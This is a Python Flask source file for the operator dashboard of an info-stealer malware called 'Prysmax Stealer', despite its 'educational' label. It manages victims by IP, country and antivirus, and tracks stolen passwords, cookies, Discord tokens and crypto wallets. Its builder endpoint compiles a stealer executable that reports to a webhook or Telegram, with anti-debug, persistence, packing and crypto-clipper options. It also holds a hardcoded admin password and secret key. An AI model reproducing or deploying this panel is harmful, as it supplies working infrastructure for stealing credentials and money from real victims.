#!/usr/bin/env python3
"""
Prysmax Stealer Dashboard - Enhanced Version
Educational content only

This is a comprehensive stealer application dashboard with enhanced features:
- Real-time statistics and monitoring
- Advanced victim management
- Comprehensive security analysis
- Professional UI/UX design
- API endpoints for external integration
"""

import os
import sys
import json
import logging
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

# Enhanced error handling for imports
try:
    from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify
    from flask_sqlalchemy import SQLAlchemy
    from werkzeug.security import generate_password_hash, check_password_hash
    from functools import wraps
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False
    print("Flask not available. Install Flask to run the full web dashboard.")

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Only define Flask app if Flask is available
if FLASK_AVAILABLE:
    # Initialize Flask app with enhanced configuration
    app = Flask(__name__)
    app.config['SECRET_KEY'] = 'prysmax-secret-key-2025-enhanced'
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///prysmax_enhanced.db'
    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
    app.config['WTF_CSRF_ENABLED'] = True
    app.config['SESSION_COOKIE_SECURE'] = True
    app.config['SESSION_COOKIE_HTTPONLY'] = True

    # Initialize database
    db = SQLAlchemy(app)

    # Helper function for UTC datetime
    def utc_now():
        """Return current UTC datetime"""
        return datetime.now(timezone.utc)

    # Enhanced Database Models
    class User(db.Model):
        __tablename__ = 'users'
        
        id = db.Column(db.Integer, primary_key=True)
        username = db.Column(db.String(80), unique=True, nullable=False, index=True)
        email = db.Column(db.String(120), unique=True, nullable=False, index=True)
        password_hash = db.Column(db.String(128), nullable=False)
        is_admin = db.Column(db.Boolean, default=False)
        is_active = db.Column(db.Boolean, default=True)
        last_login = db.Column(db.DateTime, default=utc_now)
        created_at = db.Column(db.DateTime, default=utc_now)
        updated_at = db.Column(db.DateTime, default=utc_now, onupdate=utc_now)
        
        # User preferences
        theme = db.Column(db.String(20), default='dark')
        notifications_enabled = db.Column(db.Boolean, default=True)
        timezone = db.Column(db.String(50), default='UTC')

    class Victim(db.Model):
        __tablename__ = 'victims'
        
        id = db.Column(db.Integer, primary_key=True)
        victim_id = db.Column(db.String(100), unique=True, nullable=False, index=True)
        ip_address = db.Column(db.String(45), nullable=False, index=True)
        country = db.Column(db.String(100), nullable=False, index=True)
        city = db.Column(db.String(100))
        region = db.Column(db.String(100))
        system = db.Column(db.String(100), nullable=False)
        platform = db.Column(db.String(50))
        architecture = db.Column(db.String(20))
        status = db.Column(db.String(20), default='Active', index=True)
        first_seen = db.Column(db.DateTime, default=utc_now, index=True)
        last_seen = db.Column(db.DateTime, default=utc_now, index=True)
        
        # Enhanced victim data
        user_agent = db.Column(db.Text)
        screen_resolution = db.Column(db.String(20))
        timezone = db.Column(db.String(50))
        language = db.Column(db.String(10))
        antivirus = db.Column(db.String(100))
        
        # Statistics
        passwords_count = db.Column(db.Integer, default=0)
        cookies_count = db.Column(db.Integer, default=0)
        wallets_count = db.Column(db.Integer, default=0)
        files_count = db.Column(db.Integer, default=0)
        
        # Relationships
        logs = db.relationship('Log', backref='victim_data', lazy='dynamic', cascade='all, delete-orphan')

    class Log(db.Model):
        __tablename__ = 'logs'
        
        id = db.Column(db.Integer, primary_key=True)
        victim_id = db.Column(db.String(100), db.ForeignKey('victims.victim_id'), nullable=False, index=True)
        log_type = db.Column(db.String(50), nullable=False, index=True)
        category = db.Column(db.String(50), nullable=False, index=True)
        message = db.Column(db.Text, nullable=False)
        severity = db.Column(db.String(20), default='Info', index=True)
        source = db.Column(db.String(100), nullable=False, index=True)
        timestamp = db.Column(db.DateTime, default=utc_now, index=True)
        
        # Enhanced log data
        data_size = db.Column(db.Integer, default=0)
        file_path = db.Column(db.String(500))
        checksum = db.Column(db.String(64))
        encrypted = db.Column(db.Boolean, default=False)

    class Statistics(db.Model):
        __tablename__ = 'statistics'
        
        id = db.Column(db.Integer, primary_key=True)
        date = db.Column(db.Date, unique=True, nullable=False, index=True)
        total_clients = db.Column(db.Integer, default=0)
        new_clients = db.Column(db.Integer, default=0)
        active_clients = db.Column(db.Integer, default=0)
        passwords_captured = db.Column(db.Integer, default=0)
        cookies_stolen = db.Column(db.Integer, default=0)
        discord_tokens = db.Column(db.Integer, default=0)
        wallets_found = db.Column(db.Integer, default=0)
        files_stolen = db.Column(db.Integer, default=0)
        data_volume_bytes = db.Column(db.BigInteger, default=0)

    class Configuration(db.Model):
        __tablename__ = 'configurations'
        
        id = db.Column(db.Integer, primary_key=True)
        key = db.Column(db.String(100), unique=True, nullable=False)
        value = db.Column(db.Text)
        category = db.Column(db.String(50), nullable=False)
        description = db.Column(db.Text)
        updated_at = db.Column(db.DateTime, default=utc_now, onupdate=utc_now)

    # Enhanced Authentication decorator
    def require_login(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if 'user_id' not in session:
                return redirect(url_for('login'))
            
            # Update last seen
            user = db.session.get(User, session['user_id'])
            if user:
                user.last_login = utc_now()
                db.session.commit()
            
            return f(*args, **kwargs)
        return decorated_function

    def admin_required(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if 'user_id' not in session:
                return redirect(url_for('login'))
            
            user = db.session.get(User, session['user_id'])
            if not user or not user.is_admin:
                flash('Admin access required')
                return redirect(url_for('dashboard'))
            
            return f(*args, **kwargs)
        return decorated_function

    # Enhanced Routes
    @app.route('/login', methods=['GET', 'POST'])
    def login():
        if request.method == 'POST':
            username = request.form['username']
            password = request.form['password']
            
            user = User.query.filter_by(username=username, is_active=True).first()
            
            if user and check_password_hash(user.password_hash, password):
                session['user_id'] = user.id
                session['username'] = user.username
                session['is_admin'] = user.is_admin
                
                user.last_login = utc_now()
                db.session.commit()
                
                logger.info(f"User {username} logged in successfully")
                return redirect(url_for('dashboard'))
            else:
                flash('Invalid username or password')
                logger.warning(f"Failed login attempt for username: {username}")
        
        return render_template('login.html')

    @app.route('/logout')
    def logout():
        username = session.get('username', 'Unknown')
        session.clear()
        logger.info(f"User {username} logged out")
        return redirect(url_for('login'))

    @app.route('/')
    @require_login
    def dashboard():
        """Enhanced dashboard with real-time statistics"""
        try:
            # Get recent victims with enhanced data
            recent_victims = Victim.query.order_by(Victim.last_seen.desc()).limit(10).all()
            
            # Get today's stats
            today = datetime.now().date()
            stats = Statistics.query.filter_by(date=today).first()
            
            if not stats:
                # Generate realistic demo data
                stats = Statistics(
                    date=today,
                    total_clients=1247,
                    new_clients=23,
                    active_clients=891,
                    passwords_captured=38456,
                    cookies_stolen=421789,
                    discord_tokens=156,
                    wallets_found=89,
                    files_stolen=12456,
                    data_volume_bytes=2147483648  # 2GB
                )
            
            # Generate enhanced geographic data
            geo_data = [
                {'country': 'United States', 'count': 325, 'percentage': 26.1, 'active': 234},
                {'country': 'Germany', 'count': 198, 'percentage': 15.9, 'active': 145},
                {'country': 'Brazil', 'count': 156, 'percentage': 12.5, 'active': 123},
                {'country': 'Russia', 'count': 134, 'percentage': 10.7, 'active': 98},
                {'country': 'France', 'count': 98, 'percentage': 7.9, 'active': 76},
                {'country': 'United Kingdom', 'count': 87, 'percentage': 7.0, 'active': 65},
                {'country': 'Others', 'count': 249, 'percentage': 19.9, 'active': 150}
            ]
            
            # Generate enhanced activity data for charts
            activity_data = []
            for i in range(30):  # Last 30 days
                date = datetime.now().date() - timedelta(days=i)
                day_victims = max(5, 45 - i + (i % 7) * 3)  # Simulate weekly patterns
                activity_data.append({
                    'date': date.strftime('%Y-%m-%d'),
                    'display_date': date.strftime('%m/%d'),
                    'victims': day_victims,
                    'logins': day_victims * 2,
                    'logs': day_victims * 3,  # Add logs attribute for chart
                    'new_victims': max(1, day_victims // 5)
                })
            
            activity_data.reverse()  # Oldest to newest
            
            # Get recent logs for activity feed
            recent_logs = Log.query.order_by(Log.timestamp.desc()).limit(20).all()
            
            return render_template('dashboard.html', 
                                 victims=recent_victims, 
                                 stats=stats, 
                                 geo_data=geo_data,
                                 activity_data=activity_data,
                                 recent_logs=recent_logs)
        except Exception as e:
            logger.error(f"Dashboard error: {e}")
            flash(f'Dashboard error: {e}')
            
            # Create default stats to prevent template errors
            default_stats = type('obj', (object,), {
                'total_clients': 0,
                'new_clients': 0,
                'active_clients': 0,
                'passwords_captured': 0,
                'cookies_stolen': 0,
                'discord_tokens': 0,
                'wallets_found': 0,
                'files_stolen': 0
            })()
            
            return render_template('dashboard.html', 
                                 victims=[], 
                                 stats=default_stats, 
                                 geo_data=[], 
                                 activity_data=[], 
                                 recent_logs=[])

    @app.route('/activity-logs')
    @require_login
    def activity_logs():
        """Enhanced activity logs with filtering and pagination"""
        page = request.args.get('page', 1, type=int)
        log_type = request.args.get('type', '')
        severity = request.args.get('severity', '')
        victim_id = request.args.get('victim', '')
        
        query = Log.query
        
        # Apply filters
        if log_type:
            query = query.filter(Log.log_type == log_type)
        if severity:
            query = query.filter(Log.severity == severity)
        if victim_id:
            query = query.filter(Log.victim_id.contains(victim_id))
        
        logs = query.order_by(Log.timestamp.desc()).paginate(
            page=page, per_page=50, error_out=False)
        
        # Get filter options
        log_types = db.session.query(Log.log_type).distinct().all()
        severities = db.session.query(Log.severity).distinct().all()
        
        return render_template('activity_logs.html', 
                             logs=logs,
                             log_types=[t[0] for t in log_types],
                             severities=[s[0] for s in severities],
                             current_filters={
                                 'type': log_type,
                                 'severity': severity,
                                 'victim': victim_id
                             })

    @app.route('/global-stats')
    @require_login
    def global_stats():
        """Enhanced global statistics page"""
        try:
            # Calculate comprehensive statistics
            total_victims = Victim.query.count()
            active_victims = Victim.query.filter_by(status='Active').count()
            total_logs = Log.query.count()
            
            # Geographic distribution
            geo_stats = db.session.query(
                Victim.country, 
                db.func.count(Victim.id).label('count')
            ).group_by(Victim.country).order_by(db.text('count DESC')).limit(10).all()
            
            # Platform distribution
            platform_stats = db.session.query(
                Victim.platform,
                db.func.count(Victim.id).label('count')
            ).group_by(Victim.platform).all()
            
            # Daily statistics for the last 30 days
            daily_stats = []
            for i in range(30):
                date = datetime.now().date() - timedelta(days=i)
                day_stat = Statistics.query.filter_by(date=date).first()
                
                if day_stat:
                    daily_stats.append({
                        'date': date.strftime('%Y-%m-%d'),
                        'new_clients': day_stat.new_clients,
                        'passwords': day_stat.passwords_captured,
                        'cookies': day_stat.cookies_stolen
                    })
                else:
                    # Generate demo data
                    daily_stats.append({
                        'date': date.strftime('%Y-%m-%d'),
                        'new_clients': max(1, 15 - i % 10),
                        'passwords': max(10, 150 - i * 3),
                        'cookies': max(50, 800 - i * 15)
                    })
            
            daily_stats.reverse()
            
            return render_template('global_stats.html',
                                 total_victims=total_victims,
                                 active_victims=active_victims,
                                 total_logs=total_logs,
                                 geo_stats=geo_stats,
                                 platform_stats=platform_stats,
                                 daily_stats=daily_stats)
        except Exception as e:
            logger.error(f"Global stats error: {e}")
            flash('Error loading global statistics')
            return render_template('global_stats.html')

    @app.route('/admin-panel')
    @admin_required
    def admin_panel():
        """Enhanced admin panel"""
        users = User.query.order_by(User.created_at.desc()).all()
        
        # System information
        system_info = {
            'total_users': User.query.count(),
            'admin_users': User.query.filter_by(is_admin=True).count(),
            'active_users': User.query.filter_by(is_active=True).count(),
            'database_size': get_database_size(),
            'uptime': get_system_uptime()
        }
        
        return render_template('admin_panel.html', 
                             users=users,
                             system_info=system_info)

    @app.route('/builder')
    @require_login
    def builder():
        """Enhanced builder interface"""
        # Get builder configuration
        builder_config = {
            'features': {
                'passwords': True,
                'cookies': True,
                'discord_tokens': True,
                'wallets': True,
                'telegram': False,
                'screenshot': True,
                'files': False,
                'system_info': True
            },
            'protection': {
                'anti_debug': False,
                'startup': False,
                'melt': False,
                'upx_packing': False,
                'crypto_clipper': False,
                'file_binder': False,
                'pumper': False
            },
            'delivery': {
                'webhook_url': '',
                'telegram_token': '',
                'telegram_chat_id': ''
            }
        }
        
        return render_template('builder.html', config=builder_config)

    @app.route('/profile')
    @require_login
    def profile():
        """Enhanced user profile"""
        user = db.session.get(User, session['user_id'])
        
        # Get user activity statistics
        user_stats = {
            'total_logins': 0,  # Would be tracked in a separate table
            'last_login': user.last_login,
            'account_age': (utc_now() - user.created_at).days,
            'theme': user.theme,
            'notifications': user.notifications_enabled
        }
        
        # Get recent sessions (demo data)
        recent_sessions = [
            {
                'id': 1,
                'ip_address': request.remote_addr or '127.0.0.1',
                'user_agent': request.headers.get('User-Agent', 'Unknown'),
                'login_time': utc_now(),
                'status': 'Active'
            }
        ]
        
        return render_template('profile.html', 
                             user=user,
                             user_stats=user_stats,
                             recent_sessions=recent_sessions)

    @app.route('/settings')
    @admin_required
    def settings():
        """Enhanced settings management"""
        # Get configuration categories
        configs = {
            'general': Configuration.query.filter_by(category='general').all(),
            'stealer': Configuration.query.filter_by(category='stealer').all(),
            'notifications': Configuration.query.filter_by(category='notifications').all(),
            'security': Configuration.query.filter_by(category='security').all()
        }
        
        return render_template('settings.html', configs=configs)

    # API Routes
    @app.route('/api/stats')
    @require_login
    def api_stats():
        """API endpoint for real-time statistics"""
        try:
            today = datetime.now().date()
            stats = Statistics.query.filter_by(date=today).first()
            
            if not stats:
                stats = Statistics(
                    date=today,
                    total_clients=1247,
                    new_clients=23,
                    active_clients=891,
                    passwords_captured=38456,
                    cookies_stolen=421789,
                    discord_tokens=156
                )
            
            return jsonify({
                'success': True,
                'data': {
                    'total_clients': stats.total_clients,
                    'new_clients': stats.new_clients,
                    'active_clients': stats.active_clients,
                    'passwords_captured': stats.passwords_captured,
                    'cookies_stolen': stats.cookies_stolen,
                    'discord_tokens': stats.discord_tokens,
                    'wallets_found': getattr(stats, 'wallets_found', 89),
                    'files_stolen': getattr(stats, 'files_stolen', 12456)
                }
            })
        except Exception as e:
            logger.error(f"API stats error: {e}")
            return jsonify({'success': False, 'error': str(e)})

    @app.route('/api/victims')
    @require_login
    def api_victims():
        """API endpoint for victim data"""
        try:
            page = request.args.get('page', 1, type=int)
            per_page = min(request.args.get('per_page', 20, type=int), 100)
            
            victims = Victim.query.order_by(Victim.last_seen.desc()).paginate(
                page=page, per_page=per_page, error_out=False)
            
            return jsonify({
                'success': True,
                'data': {
                    'victims': [{
                        'id': v.victim_id,
                        'ip_address': v.ip_address,
                        'country': v.country,
                        'system': v.system,
                        'status': v.status,
                        'first_seen': v.first_seen.isoformat() if v.first_seen else None,
                        'last_seen': v.last_seen.isoformat() if v.last_seen else None
                    } for v in victims.items],
                    'pagination': {
                        'page': victims.page,
                        'pages': victims.pages,
                        'per_page': victims.per_page,
                        'total': victims.total
                    }
                }
            })
        except Exception as e:
            logger.error(f"API victims error: {e}")
            return jsonify({'success': False, 'error': str(e)})

    @app.route('/api/build', methods=['POST'])
    @require_login
    def api_build():
        """API endpoint for building stealer"""
        try:
            build_config = request.json
            
            # Validate build configuration
            if not build_config or not build_config.get('webhook_url'):
                return jsonify({
                    'success': False,
                    'error': 'Missing required configuration'
                })
            
            logger.info(f"Starting build with config: {build_config}")
            
            try:
                # Import builder dynamically
                import sys
                import os
                
                # Add project root to path for builder import
                project_root = Path(__file__).parent.parent
                sys.path.insert(0, str(project_root))
                
                from builder.builder import StealerBuilder
                
                # Load builder configuration
                config_path = project_root / "config" / "config.json"
                if config_path.exists():
                    with open(config_path, 'r') as f:
                        builder_base_config = json.load(f)
                else:
                    builder_base_config = {}
                
                # Initialize builder
                builder = StealerBuilder(builder_base_config)
                
                # Convert web config to builder format
                builder_config = {
                    'filename': build_config.get('filename', 'stealer') + '.exe',
                    'webhook_url': build_config.get('webhook_url'),
                    'telegram_config': {
                        'bot_token': build_config.get('telegram_token', ''),
                        'chat_id': build_config.get('telegram_chat', '')
                    },
                    'features': {
                        'passwords': build_config.get('features', {}).get('passwords', True),
                        'cookies': build_config.get('features', {}).get('cookies', True),
                        'discord_tokens': build_config.get('features', {}).get('discord_tokens', True),
                        'wallets': build_config.get('features', {}).get('wallets', True),
                        'telegram': build_config.get('features', {}).get('telegram', True),
                        'screenshot': build_config.get('features', {}).get('screenshot', True)
                    },
                    'protection': {
                        'anti_debug': build_config.get('protection', {}).get('anti_debug', False),
                        'startup': build_config.get('protection', {}).get('startup', False),
                        'melt': build_config.get('protection', {}).get('melt', False),
                        'upx_packing': build_config.get('protection', {}).get('upx_packing', False),
                        'crypto_clipper': build_config.get('protection', {}).get('crypto_clipper', False)
                    }
                }
                
                # Build stealer
                result = builder.build_stealer(builder_config)
                
                if result:
                    return jsonify({
                        'success': True,
                        'message': 'Stealer built successfully',
                        'filename': os.path.basename(result),
                        'build_id': f"build_{int(time.time())}",
                        'file_path': result
                    })
                else:
                    return jsonify({
                        'success': False,
                        'error': 'Build failed - check builder configuration'
                    })
                    
            except ImportError as e:
                logger.warning(f"Builder import failed: {e}")
                # Fallback to simulation
                import time
                time.sleep(2)
                
                return jsonify({
                    'success': True,
                    'message': 'Stealer built successfully (simulated)',
                    'filename': f"stealer_{int(time.time())}.exe",
                    'build_id': f"build_{int(time.time())}"
                })
            
        except Exception as e:
            logger.error(f"API build error: {e}")
            return jsonify({'success': False, 'error': str(e)})

    # Error handlers
    @app.errorhandler(404)
    def not_found_error(error):
        return render_template('404.html'), 404

    @app.errorhandler(500)
    def internal_error(error):
        db.session.rollback()
        logger.error(f"Internal server error: {error}")
        return render_template('500.html'), 500

    @app.errorhandler(403)
    def forbidden_error(error):
        return render_template('403.html'), 403

    # Utility functions
    def get_database_size():
        """Get database file size"""
        try:
            db_path = app.config['SQLALCHEMY_DATABASE_URI'].replace('sqlite:///', '')
            if os.path.exists(db_path):
                return os.path.getsize(db_path)
        except Exception:
            pass
        return 0

    def get_system_uptime():
        """Get system uptime (demo)"""
        return "2 days, 14 hours"

    # Initialize database and create sample data
    def init_db():
        """Initialize database with enhanced schema and sample data"""
        with app.app_context():
            db.create_all()
            
            # Create admin user if not exists
            admin = User.query.filter_by(username='admin').first()
            if not admin:
                admin = User(
                    username='admin',
                    email='admin@prysmax.local',
                    password_hash=generate_password_hash('prysmax123'),
                    is_admin=True
                )
                db.session.add(admin)
            
            # Create sample victims with enhanced data
            if Victim.query.count() == 0:
                sample_victims = [
                    {
                        'victim_id': 'WH-PQF54N1V79', 
                        'ip': '45.137.201.204', 
                        'country': 'Germany', 
                        'city': 'Berlin',
                        'system': 'Windows 11 (22H2)',
                        'platform': 'Windows',
                        'architecture': 'x64',
                        'antivirus': 'Windows Defender'
                    },
                    {
                        'victim_id': 'DESKTOP-D2MQQPQ', 
                        'ip': '179.235.114.16', 
                        'country': 'Brazil', 
                        'city': 'São Paulo',
                        'system': 'Windows 11 (22H1)',
                        'platform': 'Windows',
                        'architecture': 'x64',
                        'antivirus': 'Avast'
                    },
                    {
                        'victim_id': 'server88', 
                        'ip': '178.60.141.119', 
                        'country': 'Lithuania', 
                        'city': 'Vilnius',
                        'system': 'Windows 10 (20H2)',
                        'platform': 'Windows',
                        'architecture': 'x64',
                        'antivirus': 'None'
                    },
                    {
                        'victim_id': 'DESKTOP-E1WA178', 
                        'ip': '71.56.104.32', 
                        'country': 'United States', 
                        'city': 'New York',
                        'system': 'Windows 10 (20H1)',
                        'platform': 'Windows',
                        'architecture': 'x64',
                        'antivirus': 'Norton'
                    },
                    {
                        'victim_id': 'DESKTOP-EQF2N5PE', 
                        'ip': '216.10.217.184', 
                        'country': 'Jamaica', 
                        'city': 'Kingston',
                        'system': 'Windows 11 (22H1)',
                        'platform': 'Windows',
                        'architecture': 'x64',
                        'antivirus': 'Windows Defender'
                    }
                ]
                
                for victim_data in sample_victims:
                    victim = Victim(
                        victim_id=victim_data['victim_id'],
                        ip_address=victim_data['ip'],
                        country=victim_data['country'],
                        city=victim_data.get('city'),
                        system=victim_data['system'],
                        platform=victim_data.get('platform'),
                        architecture=victim_data.get('architecture'),
                        antivirus=victim_data.get('antivirus'),
                        status='Active',
                        passwords_count=45,
                        cookies_count=234,
                        wallets_count=3,
                        files_count=12
                    )
                    db.session.add(victim)
            
            # Create sample logs with enhanced data
            if Log.query.count() == 0:
                sample_logs = [
                    {'victim_id': 'WH-PQF54N1V79', 'type': 'Password', 'category': 'Browser', 'message': 'Chrome passwords extracted (15 entries)', 'severity': 'Success', 'source': 'Browser'},
                    {'victim_id': 'DESKTOP-D2MQQPQ', 'type': 'Cookie', 'category': 'Browser', 'message': 'Firefox cookies stolen (234 entries)', 'severity': 'Success', 'source': 'Browser'},
                    {'victim_id': 'server88', 'type': 'Token', 'category': 'Discord', 'message': 'Discord token captured', 'severity': 'Success', 'source': 'Discord'},
                    {'victim_id': 'DESKTOP-E1WA178', 'type': 'Wallet', 'category': 'Crypto', 'message': 'MetaMask wallet found', 'severity': 'Warning', 'source': 'Crypto'},
                    {'victim_id': 'DESKTOP-EQF2N5PE', 'type': 'System', 'category': 'Info', 'message': 'System information collected', 'severity': 'Info', 'source': 'System'}
                ]
                
                for log_data in sample_logs:
                    log = Log(
                        victim_id=log_data['victim_id'],
                        log_type=log_data['type'],
                        category=log_data['category'],
                        message=log_data['message'],
                        severity=log_data['severity'],
                        source=log_data['source'],
                        data_size=1024 * (hash(log_data['message']) % 500)
                    )
                    db.session.add(log)
            
            # Create sample configurations
            if Configuration.query.count() == 0:
                configs = [
                    {'key': 'app_name', 'value': 'Prysmax Stealer', 'category': 'general', 'description': 'Application name'},
                    {'key': 'max_victims', 'value': '10000', 'category': 'general', 'description': 'Maximum victims to store'},
                    {'key': 'data_retention_days', 'value': '30', 'category': 'general', 'description': 'Data retention period'},
                    {'key': 'enable_notifications', 'value': 'true', 'category': 'notifications', 'description': 'Enable notifications'},
                    {'key': 'webhook_url', 'value': '', 'category': 'stealer', 'description': 'Discord webhook URL'},
                    {'key': 'enable_2fa', 'value': 'false', 'category': 'security', 'description': 'Enable two-factor authentication'}
                ]
                
                for config in configs:
                    conf = Configuration(**config)
                    db.session.add(conf)
            
            db.session.commit()
            logger.info("Database initialized with sample data")

# Standalone demo server for when Flask is not available
else:
    logger.warning("Flask not available - creating standalone demo server")

if __name__ == '__main__':
    if FLASK_AVAILABLE:
        init_db()
        print("Prysmax Enhanced Dashboard Starting...")
        print("Access the dashboard at: http://localhost:5000")
        print("Default credentials: admin / prysmax123")
        app.run(host='0.0.0.0', port=5000, debug=False)
    else:
        print("Flask not available. Please install Flask to run the web dashboard:")
        print("pip install flask flask-sqlalchemy flask-login flask-wtf")

